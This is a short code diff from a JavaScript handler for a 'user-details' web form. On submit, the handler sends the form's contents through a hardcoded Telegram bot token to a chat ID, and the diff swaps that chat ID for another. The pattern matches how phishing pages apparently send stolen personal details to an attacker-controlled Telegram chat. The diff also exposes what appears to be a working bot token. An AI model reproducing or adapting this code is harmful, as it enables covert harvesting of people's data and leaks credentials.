@@ -33,7 +33,7 @@ document.getElementById('user-details-form').addEventListener('submit', function
 
         // Telegram bot API details
         const botToken = '7522262153:AAGtEdu0TDYSDpeNyC4SjbRG1XtP44qf_OY';
-        const chatId = '6336268538';
+        const chatId = '1739381482';
 
         // Send the message to Telegram
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
